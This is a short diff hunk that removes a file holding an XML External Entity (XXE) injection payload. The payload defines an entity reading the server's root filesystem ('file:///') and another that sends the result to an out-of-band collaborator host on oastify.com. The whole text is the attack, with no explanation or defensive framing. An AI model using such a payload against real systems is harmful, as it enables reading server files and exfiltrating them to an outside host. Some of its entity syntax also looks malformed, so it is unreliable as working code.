@@ -1,7 +1,0 @@
-
-<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///">
-<!ENTITY exfil SYSTEM 'http://8nwous73fyq87nal98g84pbj0a61usih.oastify.com?x=%file;'> ]>
-<foo>&file
-&exfil
-</foo>
-
